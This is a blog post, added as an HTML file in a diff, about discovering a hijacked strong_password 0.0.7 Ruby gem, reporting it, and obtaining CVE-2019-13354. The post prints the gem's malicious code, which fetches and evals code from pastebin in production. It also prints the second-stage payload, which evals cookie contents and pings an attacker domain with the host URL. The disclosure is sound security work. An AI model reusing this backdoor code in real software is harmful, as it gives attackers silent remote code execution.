@@ -1,0 +1,222 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1' />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:domain" value="withatwist.dev" />
+      <meta name="twitter:title" content="strong_password v0.0.7 rubygem hijacked - withatwist.dev" />
+      <meta name="twitter:description" content="I recently updated minor and patch versions of the gems our Rails app uses. We
+want to keep dependencies fresh, bugs fixed, security vulnerabilities addressed
+while maintaining a high chance ... " />
+    <meta name="twitter:image" content="https://withatwist.dev/logo.png" />
+      <meta name="twitter:url" value="https://withatwist.dev/2019-07-03-strong_password-rubygem-hijacked.html" />
+    <link href="/stylesheets/all.css" rel="stylesheet" />
+    <title>strong_password v0.0.7 rubygem hijacked - With a Twist.dev</title>
+    <link rel="alternate" type="application/atom+xml" title="WithaTwist.dev" href="/feed.xml" />
+    <link rel="icon" type="image/png" href="/favicon.png" />
+    <link rel="apple-touch-icon" href="/favicon.png" />
+  </head>
+  <body>
+    <header>
+      <h1>
+        <a href="/">
+          <img src="logo.png" alt="With a Twist - Software Development">
+        </a>
+      </h1>
+    </header>
+
+    <div id="container">
+      <div id="main" role="main">
+          <div class="article">
+            <h1>strong_password v0.0.7 rubygem hijacked</h1>
+            <p class="author">
+              Tute Costa
+              <span class="date">July  3, 2019</span>
+            </p>
+
+            <p>I recently updated minor and patch versions of the gems our Rails app uses. We
+want to keep dependencies fresh, bugs fixed, security vulnerabilities addressed
+while maintaining a high chance of backward compatibility with our codebase. In
+all, it was 25 gems we’d upgrade.</p>
+
+<p>I went line by line linking to each library&rsquo;s changeset. <strong>This due diligence
+never reported significant surprises to me, until this time</strong>.  Most
+gems have a <code>CHANGELOG.md</code> file that describes the changes in each version. Some
+do not, and I had to compare by git tags or commits list (like cocoon or bcrypt
+gems). The <code>jquery-rails</code> upgrade contains a <code>jQuery.js</code> upgrade, so the related
+log was in another project.</p>
+
+<p><strong>And I couldn’t find the changes for <code>strong_password</code></strong>. It appeared to have
+gone from 0.0.6 to 0.0.7, yet the last change in any branch in GitHub was from 6
+months ago, and we were up to date with those. If there was new code, it existed
+only in <code>RubyGems.org</code>.</p>
+
+<p>I downloaded the gem from RubyGems and compared its contents with the latest
+copy in GitHub. At the end of <code>lib/strong_password/strength_checker.rb</code> version
+0.0.7 there was the following:</p>
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_!</span><span class="p">;</span><span class="k">begin</span><span class="p">;</span><span class="k">yield</span><span class="p">;</span><span class="k">rescue</span> <span class="no">Exception</span><span class="p">;</span><span class="k">end</span><span class="p">;</span><span class="k">end</span>
+<span class="n">_!</span><span class="p">{</span><span class="no">Thread</span><span class="p">.</span><span class="nf">new</span><span class="p">{</span><span class="kp">loop</span><span class="p">{</span><span class="n">_!</span><span class="p">{</span><span class="nb">sleep</span>
+<span class="nb">rand</span><span class="o">*</span><span class="mi">3333</span><span class="p">;</span><span class="nb">eval</span><span class="p">(</span><span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s1">'https://pastebin.com/raw/xa456PFt'</span><span class="p">)))}}}</span><span class="k">if</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">env</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s2">"p"</span><span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>
+<p>I checked who published it and it was an almost empty account, with a different
+name than the maintainer’s, with access only to this gem. I checked the
+maintainer’s email in GitHub and wrote to him with the prettified version of the
+diff:</p>
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_!</span><span class="p">;</span>
+  <span class="k">begin</span><span class="p">;</span>
+    <span class="k">yield</span><span class="p">;</span>
+  <span class="k">rescue</span> <span class="no">Exception</span><span class="p">;</span>
+  <span class="k">end</span><span class="p">;</span>
+<span class="k">end</span>
+
+<span class="n">_!</span><span class="p">{</span>
+  <span class="no">Thread</span><span class="p">.</span><span class="nf">new</span> <span class="p">{</span>
+    <span class="kp">loop</span> <span class="p">{</span>
+      <span class="n">_!</span><span class="p">{</span>
+        <span class="nb">sleep</span> <span class="nb">rand</span> <span class="o">*</span> <span class="mi">3333</span><span class="p">;</span>
+        <span class="nb">eval</span><span class="p">(</span>
+          <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
+            <span class="no">URI</span><span class="p">(</span><span class="s1">'https://pastebin.com/raw/xa456PFt'</span><span class="p">)</span>
+          <span class="p">)</span>
+        <span class="p">)</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">if</span> <span class="no">Rails</span><span class="p">.</span><span class="nf">env</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"p"</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>
+<p>In a loop within a new thread, after waiting for a random number of seconds up
+to about an hour, it fetches and runs the code stored in a <code>pastebin.com</code>, only if
+running in production, with an empty exception handler that ignores any error
+it may raise.</p>
+
+<p>In fifteen minutes, Brian McManus wrote back:</p>
+
+<blockquote>
+<p>The gem seems to have been pulled out from under me… When I login to
+rubygems.org I don’t seem to have ownership now. Bogus 0.0.7 release was
+created 6/25/2019.</p>
+</blockquote>
+
+<p>In case the Pastebin got deleted or changed, I emailed the Pastebin that was up
+on June 28th at 8 PM UTC, carbon-copying Ruby on Rails’ security coordinator,
+<a href="https://twitter.com/rafaelfranca">Rafael França</a>:</p>
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="n">_!</span> <span class="p">{</span>
+<span class="k">unless</span> <span class="k">defined?</span><span class="p">(</span><span class="no">Z1</span><span class="p">)</span>
+  <span class="no">Rack</span><span class="o">::</span><span class="no">Sendfile</span><span class="p">.</span><span class="nf">prepend</span> <span class="no">Module</span><span class="p">.</span><span class="nf">new</span><span class="p">{</span><span class="n">define_method</span><span class="p">(</span><span class="ss">:call</span><span class="p">){</span><span class="o">|</span><span class="n">e</span><span class="o">|</span>
+  <span class="n">_!</span><span class="p">{</span><span class="nb">eval</span><span class="p">(</span><span class="no">Base64</span><span class="p">.</span><span class="nf">urlsafe_decode64</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="s1">'HTTP_COOKIE'</span><span class="p">].</span><span class="nf">match</span><span class="p">(</span><span class="sr">/___id=(.+);/</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))}</span>
+  <span class="k">super</span><span class="p">(</span><span class="n">e</span><span class="p">)}}</span>
+  <span class="no">Z1</span> <span class="o">=</span> <span class="s2">"(:"</span>
+<span class="k">end</span>
+<span class="p">}</span>
+
+<span class="n">_!</span> <span class="p">{</span>
+  <span class="no">Faraday</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"http://smiley.zzz.com.ua"</span><span class="p">,</span> <span class="p">{</span> <span class="s2">"x"</span> <span class="o">=&gt;</span> <span class="no">ENV</span><span class="p">[</span><span class="s2">"URL_HOST"</span><span class="p">].</span><span class="nf">to_s</span> <span class="p">})</span>
+</pre></td></tr></tbody></table></code></pre></div>
+<p>While waiting for their answers, I tried to understand the code. If it didn&rsquo;t
+run before (checking for the existence of the <code>Z1</code> dummy constant) it injects a
+middleware that <code>eval</code>&lsquo;s cookies named with an <code>___id</code> suffix, only in
+production, all surrounded by the empty exception handler <code>_!</code> function that&rsquo;s
+defined in the hijacked gem, opening the door to <strong>silently executing remote
+code in production at the attacker’s will</strong>.</p>
+
+<p>It also sends a request to a controlled domain with an HTTP header informing the
+infected host URLs. It depends on the Faraday gem being loaded for the
+notification to work (which the <code>oauth2</code> and <code>stripe</code> gems, for example,
+include).</p>
+
+<p>Rafael França replied in 25 minutes, adding <code>security@rubygems.org</code> to the thread.
+Someone at RubyGems quickly yanked it, and the next day André Arko confirmed he
+had yanked it, locked the <code>kickball</code> RubyGems account, and added Brian back to
+the gem.</p>
+
+<p>I asked for a CVE identifier (Common Vulnerabilities and Exposures) to
+<code>cve-request@mitre.org</code>, and they assigned CVE-2019-13354, which I used to announce
+the potential issue in production installations to the <a href="https://github.com/rubysec/ruby-advisory-db">rubysec/ruby-advisory-db</a>
+project and the <a href="https://groups.google.com/forum/#!forum/ruby-security-ann">ruby-security-ann Google Group</a>.</p>
+
+<hr>
+
+<p>EDIT (July 8th): the author <a href="https://news.ycombinator.com/item?id=20382779">explained how he thinks his account was taken
+over</a>. He had his RubyGems
+account for long enough that 2-factor-auth wasn’t even an option, back then he
+didn’t have unique passwords in different websites, and since then many services
+got breached, and attackers might have guessed his credentials. <strong>Use password
+managers! Rotate weak passwords and activate 2FA wherever it matters</strong>.</p>
+
+
+              <hr>
+              <p class="author-blurb">
+                <a href="https://www.tutecosta.com/">Tute Costa</a> is a Staff Engineer and founder of <a href="https://railspilot.ai/">RailsPilot.ai</a>, an AI-augmented Rails development service.
+                He writes about software and AI tools at <a href="https://withatwist.dev/">withatwist.dev</a>.
+                When not coding, you can find him riding his bike in the sierras of Córdoba, Argentina.
+                Online at <a href="https://www.tutecosta.com/">tutecosta.com</a>, on <a href="https://twitter.com/tutec">Twitter</a>, and <a href="https://github.com/tute">GitHub</a>.
+              </p>
+          </div>
+      </div>
+
+      <footer>
+        <ul>
+          <li><h5 class="heading">Previous Articles</h5></li>
+          <li>
+            <ol>
+                <li><a href='/one-telegram-contact-to-rule-my-team-of-ai-agents'>One Telegram contact to rule my team of AI agents</a></li>
+                <li><a href='/an-agent-chat-that-turned-into-skill-that-tests-itself'>An agent chat turned into a skill, and then it QA'd itself</a></li>
+                <li><a href='/claude-tell-me-what-needs-my-attention-today'>Claude, tell me what needs my attention today</a></li>
+                <li><a href='/how-i-use-ai-agents-to-code-new-features'>How I use AI agents to code new features</a></li>
+                <li><a href='/writing-architecture-documents-for-developers'>Writing Architecture Documents (for developers)</a></li>
+                <li><a href='/mystery-guest-development-edition'>Mystery Guest Development Edition</a></li>
+                <li><a href='/our-git-branching-model'>A git branching model for 15 people sharing a single testing environment</a></li>
+                <li><a href='/our-rails-engines-spike'>Rails Monolith towards Engines spike - Our story</a></li>
+                <li><a href='/backward-compatible-database-migrations'>Backward-compatible database migrations</a></li>
+                <li><a href='/avoid-nil-at-the-database-layer'>Avoiding nil in Ruby programs (and NULL in databases)</a></li>
+                <li><a href='/the-12-factor-app-dev-and-prod-parity'>Development/Production parity for Rails Internationalization</a></li>
+                <li><a href='/keep-it-simple-kiss'>Keep It Simple (KISS coding principle)</a></li>
+                <li><a href='/using-logs-to-power-up-your-rails-development-workflow'>Using logs to power up your Rails development workflow</a></li>
+                <li><a href='/reporting-on-the-fly'>Reporting from ephemeral containers in production</a></li>
+                <li><a href='/strong-password-rubygem-hijacked'>strong_password v0.0.7 rubygem hijacked</a></li>
+            </ol>
+          </li>
+        </ul>
+      </footer>
+    </div>
+  </body>
+</html>
